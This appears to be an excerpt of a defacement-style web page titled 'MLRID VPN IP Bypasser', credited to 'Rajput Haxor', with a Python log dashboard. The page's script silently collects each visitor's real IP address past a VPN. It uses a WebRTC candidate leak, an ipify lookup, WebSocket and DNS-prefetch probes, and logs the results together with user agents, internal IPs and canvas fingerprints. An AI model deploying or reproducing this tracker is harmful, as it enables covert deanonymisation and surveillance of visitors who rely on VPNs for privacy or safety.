...
<html>
<head>
<title>MLRID VPN IP Bypasser</title>  
<link rel="icon" type="image/png" href="https://nathanprinsley-files.prinsh.com/data-1/images/NathanPrinsley-AnonymousLogo-compressed.jpg"/> 
 ...
 <meta name='description' content='Hacked By Rajput Haxor'/> 
 ...
 <meta name='keywords' content='Hacked By Rajput Haxor'/> 
...
<svg>  
 ...
 <h1>MLRID VPN Bypasser</h1>
 <h2>I Can See You Though !!! - <br> Made by Rajput Haxor</h2>
	...
	(async () => {
	    ...
	    function logIP(source, ip) {
		if (!ipList.has(ip)) {
		    ipList.add(ip);
		    console.log(`${source} IP:`, ip);
		    // Use a local logging endpoint or handle it as required
		    fetch(`/log?${source}=${ip}`);
		}
	    }

	    // =WebRTC IP Leak (Primary)
		...
		if (event && event.candidate && event.candidate.candidate) {
		    ...
		    if (!ip.includes(".local") && !ip.startsWith("192.") && !ip.startsWith("10.") && !ip.startsWith("172.") && !ip.startsWith("169.254")) {
		        logIP("First-IP", ip);
		    }
		}
	    };

	    // External Public IP API (Backup)
	    fetch("https://api64.ipify.org?format=json")
		.then(res => res.json())
		.then(data => logIP("Second-IP", data.ip))
		.catch(err => console.error("Error fetching public IP:", err));

	    // WebSockets IP Leak
	    let socket = new WebSocket("wss://echo.websocket.org");
	    socket.onopen = () => logIP("IP-Leak", "Enabled");
	    socket.onerror = () => logIP("IP-Leak", "Blocked");

	    // DNS Prefetch Exploit
	    let dnsPrefetch = document.createElement("link");
	    dnsPrefetch.rel = "dns-prefetch";
	    dnsPrefetch.href = `/log?source=DNS_Prefetch`;
...
def dashboard():
    ...
    '''
    for log in logs[::-1]:  # Reverse to show latest first
        timestamp = log.get("timestamp", "N/A")
        ip = log.get("ip", "N/A")
        headers = log.get("headers", {})
        data = log.get("data", {})
        ua = data.get("userAgent", "N/A")
        internal_ips = ", ".join(data.get("internalIPs", [])) if isinstance(data.get("internalIPs"), list) else "N/A"
        canvas = data.get("canvasFingerprint", "")
        canvas_short = canvas[:30] + "..." if canvas else "N/A"
